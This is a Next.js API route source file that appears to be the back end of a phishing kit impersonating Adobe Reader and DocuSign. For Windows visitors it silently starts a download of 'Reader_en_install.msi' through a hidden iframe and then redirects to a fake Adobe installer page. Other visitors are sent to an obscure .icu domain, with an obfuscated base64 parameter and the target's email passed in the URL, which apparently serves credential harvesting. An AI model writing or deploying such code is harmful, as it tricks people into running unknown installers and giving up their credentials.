// pages/api/redirect.js
import fs from 'fs';
import path from 'path';

export default function handler(req, res) {
  const userAgent = req.headers['user-agent'] || "";
  const isWindows = /windows/i.test(userAgent);

  // Get email from query param (?email=...)
  const email = Array.isArray(req.query.email) ? req.query.email[0] : req.query.email || '';
  const safeEmail = email ? encodeURIComponent(email) : '';

  if (isWindows) {
    // HTML page that triggers MSI download and redirects
    const html = `
      <!DOCTYPE html>
      <html>
        <head>
          <meta charset="UTF-8">
          <title>Download</title>
        </head>
        <body>
          <p>Your download will start shortly...</p>
          <script>
            // Trigger download via hidden iframe
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = '/Reader_en_install.msi';  // must match file in /public
            document.body.appendChild(iframe);

            // Redirect after delay
            setTimeout(() => {
              window.location.href = 'https://jomry.com/adobe-readers/installer/download.html';
            }, 3000); // 3 seconds
          </script>
        </body>
      </html>
    `;

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.status(200).send(html);

  } else {
    // Non-Windows users: redirect to DocuSign with email fragment if provided
    const base = 'https://accounts.bsmszq.icu?BTqoJQbzww=aHR0cHM6Ly9oZWxweC5hZG9iZS5jb20vY2EvYWNyb2JhdC9rYi9jYW50LW9wZW4tcGRmLmh0bWw=';
    const finalUrl = safeEmail ? `${base}#${safeEmail}` : base;

    const html = `
      <!DOCTYPE html>
      <html>
        <head><meta charset="UTF-8"><title>Redirecting…</title></head>
        <body>
          <p>Redirecting…</p>
          <script>
            window.location.replace(${JSON.stringify(finalUrl)});
          </script>
          <noscript>
            <meta http-equiv="refresh" content="0;url=${finalUrl}">
          </noscript>
        </body>
      </html>
    `;

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.status(200).send(html);
  }
}
